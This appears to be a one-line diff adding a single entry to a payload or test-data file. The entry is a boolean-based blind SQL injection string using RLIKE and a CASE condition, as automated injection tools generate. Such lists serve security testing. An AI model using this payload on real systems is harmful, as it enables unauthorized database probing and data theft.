@@ -1,0 +1,1 @@
+1') rlike (select (case when (9308=2540) then 1 else 0x28 end)) and ('rghd'='rghd
